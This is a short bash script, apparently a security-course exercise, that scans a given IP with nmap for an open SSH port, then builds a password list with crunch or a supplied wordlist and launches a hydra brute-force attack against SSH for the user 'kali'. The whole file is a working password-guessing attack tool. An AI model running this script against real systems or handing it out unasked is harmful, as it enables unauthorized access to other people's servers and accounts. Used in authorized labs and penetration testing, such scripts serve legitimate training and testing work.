#!/bin/bash

#Create a script that will get from the user an IP
IP=$1
#a. Check if the SSH is open, and ask if to run BF attack

nmap $1 -p 22 -oG 22port.scan
if [ -z "$(cat 22port.scan | grep 22 | grep open)" ]
then
	echo "[!] Port is closed in $IP; please enter a new IP."
	exit
fi

read -p "[*] SSH is found on $IP; woule you like to start BF [y/n]" CHECK
if [ "$CHECK" == "n" ]
then
	echo "Thank you for using this."
	exit
fi

#b. Let the user choose if to use crunch or give a password list

read -p "[?] BF: Crunch of PasswordList [c/p]" CHECK

case $CHECK in
	c)
		read -p "[*] Enter minimum char: " min
		read -p "[*] Enter maximum char: " max
		read -p "[*] Enter characters: " chars
		crunch $min $max $chars > crunchlist
		cat crunchlist > passlist
		;;
	p)
		read -p "[*] Please specify a list to use." list
		cat $list > passlist
		;;
	*)
		echo "[*] You didn't choose from list, please run again"
		exit
		;;
esac
#c. Print to the user if the password was found

hydra $IP -l kali -P passlist ssh
